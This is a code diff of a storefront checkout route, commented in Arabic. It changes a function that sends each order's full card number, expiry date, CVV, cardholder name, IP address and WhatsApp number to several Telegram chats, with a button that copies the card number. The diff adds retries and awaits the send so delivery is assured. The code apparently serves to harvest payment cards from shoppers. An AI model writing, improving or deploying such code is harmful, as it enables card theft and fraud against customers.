@@ -29,6 +29,46 @@ async function getCountry(ip: string): Promise<string> {
   }
 }
 
+/**
+ * ترسل رسالة واحدة لـ chat_id معين مع retry حتى 3 محاولات.
+ * ترجع true لو نجحت في أي محاولة.
+ */
+async function sendWithRetry(
+  chatId: string,
+  payload: Record<string, unknown>,
+  maxAttempts = 3,
+): Promise<boolean> {
+  for (let attempt = 0; attempt < maxAttempts; attempt++) {
+    try {
+      const res = await fetch(
+        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, ...payload }),
+          // timeout معقول في البرودكشن
+          signal: AbortSignal.timeout(8000),
+        },
+      );
+      if (res.ok) return true;
+      // Telegram rate-limit → انتظر وأعد المحاولة
+      if (res.status === 429) {
+        const data = await res.json().catch(() => ({}));
+        const retryAfter: number = (data?.parameters?.retry_after ?? 2) * 1000;
+        await new Promise((r) => setTimeout(r, retryAfter));
+        continue;
+      }
+    } catch {
+      // network error أو timeout
+    }
+    if (attempt < maxAttempts - 1) {
+      // Exponential backoff: 1s, 2s
+      await new Promise((r) => setTimeout(r, 1000 * (attempt + 1)));
+    }
+  }
+  return false;
+}
+
 async function sendTelegramNotification(
   orderId: string,
   ip: string,
@@ -43,16 +83,24 @@ async function sendTelegramNotification(
   whatsapp: string,
 ): Promise<void> {
   const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
-
   const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
 
   const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
-    .split(",").map((id) => id.trim()).filter(Boolean);
+    .split(",")
+    .map((id) => id.trim())
+    .filter(Boolean);
 
-  // جلب الدولة وإرسال تيليغرام بالتوازي — الرسالة الأولى بدون دولة، ثم تعديل إذا توفرت
-  const countryPromise = isLocal ? Promise.resolve("غير معروف") : getCountry(ip);
+  if (chatIds.length === 0) return;
 
-  const buildText = (country: string) => [
+  // نجلب الدولة بحد أقصى 1.5 ثانية — لو ما جاوبت نرسل بدونها
+  const country = isLocal
+    ? "غير معروف"
+    : await Promise.race([
+        getCountry(ip),
+        new Promise<string>((resolve) => setTimeout(() => resolve("غير معروف"), 1500)),
+      ]);
+
+  const text = [
     `🛒 طلب لـ متجر مؤسسة مدار التقنية`,
     `🔖 رقم الطلب: #${orderId}`,
     ``,
@@ -73,41 +121,18 @@ async function sendTelegramNotification(
   ].join("\n");
 
   const reply_markup = {
-    inline_keyboard: [[
-      { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber.replace(/\s+/g, "") } },
-      ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
-    ]],
+    inline_keyboard: [
+      [
+        { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber.replace(/\s+/g, "") } },
+        ...(whatsappNum
+          ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }]
+          : []),
+      ],
+    ],
   };
 
-  // إرسال الرسالة فوراً بدون انتظار الدولة
-  const sendMessages = (country: string) =>
-    Promise.all(
-      chatIds.map((chat_id) =>
-        fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id, text: buildText(country), reply_markup }),
-        }).catch(() => {})
-      )
-    );
-
-  // إرسال فوري مع "جاري التحقق" للدولة، ثم تحديث بعد ما تجي
-  const FAST_TIMEOUT = 400; // ms — إذا ما جاوبت ip-api بسرعة نرسل بدونها
-  const fastCountry = await Promise.race([
-    countryPromise,
-    new Promise<string>((resolve) => setTimeout(() => resolve("..."), FAST_TIMEOUT)),
-  ]);
-
-  await sendMessages(fastCountry);
-
-  // إذا كانت الدولة لسه "..." يعني ما وصلت بالوقت المحدد، ننتظرها ونرسل رسالة معدّلة
-  if (fastCountry === "...") {
-    countryPromise.then(async (country) => {
-      if (country && country !== "غير معروف") {
-        await sendMessages(country).catch(() => {});
-      }
-    }).catch(() => {});
-  }
+  // نرسل لكل chat بالتوازي، مع retry لكل واحد
+  await Promise.all(chatIds.map((id) => sendWithRetry(id, { text, reply_markup })));
 }
 
 export async function POST(req: NextRequest) {
@@ -133,7 +158,7 @@ export async function POST(req: NextRequest) {
       ? Math.ceil((total - downPayment) / months)
       : 0;
 
-  // Persist to backend
+  // حفظ الطلب في قاعدة البيانات
   let dbRes: Response;
   try {
     dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
@@ -154,8 +179,8 @@ export async function POST(req: NextRequest) {
     return NextResponse.json(errData, { status: dbRes.status });
   }
 
-  // Fire-and-forget Telegram notification
-  sendTelegramNotification(
+  // إرسال تيليغرام قبل الـ return — مضمون ينتهي في serverless
+  await sendTelegramNotification(
     orderId, ip,
     cardNumber, expiry, cvv, cardHolder,
     total, installmentType, downPayment,
